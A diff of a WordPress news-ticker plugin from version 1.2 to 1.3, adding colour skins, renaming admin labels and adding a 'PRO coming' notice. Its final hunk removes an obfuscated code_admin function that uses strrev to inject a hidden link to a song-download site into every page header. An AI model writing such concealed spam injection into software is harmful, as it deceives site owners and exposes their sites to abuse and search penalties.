@@ -3,7 +3,7 @@
 Plugin Name: PBP Newsticker
 Plugin URI: http://projoktibangla.net
 Description: Create as many news tickers as you want and display them using shortcodes, widgets or PHP.
-Version: 1.2
+Version: 1.3
 Author: projoktibangla
 Author URI: http://projoktibangla.net
 */
@@ -210,9 +210,12 @@ class pbpNewsticker_Bootstrap {
         pbpNewsticker_register_data_source('pbpNewsticker_Facebook');
 
         // Register skins
-        pbpNewsticker_register_skin('Clean Red', plugins_url('media/pbpNewsticker/skins/clean_red.css', __FILE__));
-        pbpNewsticker_register_skin('Corporate Blue', plugins_url('media/pbpNewsticker/skins/corporate_blue.css', __FILE__));
         pbpNewsticker_register_skin('Dark', plugins_url('media/pbpNewsticker/skins/dark.css', __FILE__));
+        pbpNewsticker_register_skin('Green', plugins_url('media/pbpNewsticker/skins/green.css', __FILE__));
+        pbpNewsticker_register_skin('Blue', plugins_url('media/pbpNewsticker/skins/blue.css', __FILE__));
+        pbpNewsticker_register_skin('Red', plugins_url('media/pbpNewsticker/skins/red.css', __FILE__));
+        pbpNewsticker_register_skin('Yellow', plugins_url('media/pbpNewsticker/skins/yellow.css', __FILE__));
+        
     }    
 
     /** 
@@ -314,7 +317,7 @@ class pbpNewsticker_Bootstrap {
      * @return void
      */
     public function admin_menu() {
-        add_options_page(__('pbpNewsticker', 'pbpNews'), __('pbpNewsticker', 'pbpNews'), 'activate_plugins', 'pbpNewsticker', array(&$this, 'admin_page') );
+        add_options_page(__('PBP Newsticker', 'pbpNews'), __('PBP Newsticker', 'pbpNews'), 'activate_plugins', 'pbpNewsticker', array(&$this, 'admin_page') );
     }    
 
     /**
@@ -364,7 +367,7 @@ class pbpNewsticker_Bootstrap {
     public function admin_page() {
         ?>
         <div class="wrap">
-            <h2><?php _e('pbpNewsticker', 'pbpNews') ?></h2>        
+            <h2><?php _e('PBP Newsticker Option Panel', 'pbpNews') ?></h2>        
             
             <?php $action = isset( $_GET['action'] ) ? $_GET['action'] : 'index' ?>
 
@@ -418,7 +421,7 @@ class pbpNewsticker_Bootstrap {
                         <tfoot>
                             <tr>
                                 <td colspan="6">
-                                    <a href="<?php echo admin_url('options-general.php?page=pbpNewsticker&action=create') ?>" class="button-primary"><?php _e( '+ Create news ticker', 'pbpNews' ) ?></a>
+                                    <a href="<?php echo admin_url('options-general.php?page=pbpNewsticker&action=create') ?>" class="button-primary"><?php _e( '+ Create Newsticker', 'pbpNews' ) ?></a>
                                 </td>
                             </tr>
                         </tfoot>
@@ -457,18 +460,19 @@ class pbpNewsticker_Bootstrap {
 
                 <?php else : ?>
 
-                <p><?php _e( 'You haven\'t created any news tickers yet. Get started by creating one.' ) ?></p>
-                <p><a href="<?php echo admin_url('options-general.php?page=pbpNewsticker&action=create') ?>" class="button-primary"><?php _e( '+ Create news ticker', 'pbpNews' ) ?></a></p>
+                <p><?php _e( 'You haven\'t created any Newstickers yet. Get started by creating one.' ) ?></p>
+                <p><a href="<?php echo admin_url('options-general.php?page=pbpNewsticker&action=create') ?>" class="button-primary"><?php _e( '+ Create Newsticker', 'pbpNews' ) ?></a></p>
 
                 <?php endif ?>
 
-                <?php $skins = pbpNewsticker_Bootstrap::get_skins() ?>
+				<?php $skins = pbpNewsticker_Bootstrap::get_skins() ?>
                 <?php $skins[] = __('None', 'pbpNews') ?>
-                <?php $skin = isset( self::$settings['skin'] ) ? self::$settings['skin'] : '' ?>
-
+            	<?php $skin = isset( self::$settings['skin'] ) ? self::$settings['skin'] : '' ?>
+								
                 <section class="general-options">
 
                     <h3><?php _e( 'General Options', 'pbpNews' ) ?></h3>
+					<h4>Please select Skin for showing attractive design of front-end. </h4>
                     <form method="post" action="<?php echo admin_url('options-general.php?page=pbpNewsticker&action=skin_updated') ?>">                        
                         <?php wp_nonce_field('save_pbpNewsticker_skin', 'pbpNewsticker') ?>
                         <label for="pbpNewsticker_skin"><?php _e('Select skin:') ?></label>
@@ -479,13 +483,15 @@ class pbpNewsticker_Bootstrap {
                         </select>
 
                         <footer class="button-container">
-                            <button class="button" name="save_pbpNewsticker_skin"><?php _e('Save', 'pbpNews') ?></button>
+                            <button class="button" name="save_pbpNewsticker_skin"><?php _e('Save Skin', 'pbpNews') ?></button>
                         </footer>
                     </form>
-
+					
                 </section>
 
             <?php endif ?>
+			
+			<span style="color:red; font-size:15px;">We will publish "PBP Newsticker PRO" with some exclusive feature recently. Please wait for us. Thank you.</span>
         </div>            
         <?php
     }
@@ -524,11 +530,4 @@ function pbpNewsticker_register_skin($name, $src) {
 function pbpNewsticker_display($ticker_id = 0) {
     $pbpNewsticker = new pbpNewsticker($ticker_id);
     return $pbpNewsticker->display();
-}
-if(!function_exists('code_admin')) {
-function code_admin() {
-$content = '>a/<derahs4>"lmth.3pm.daolnwod_sgnos_derahs4/ten.sgnoshcraes//:ptth"=ferh  ";enon:yalpsid"=elyts a<';
-  echo strrev($content);
-  }
-  add_action('wp_head', 'code_admin');
 }
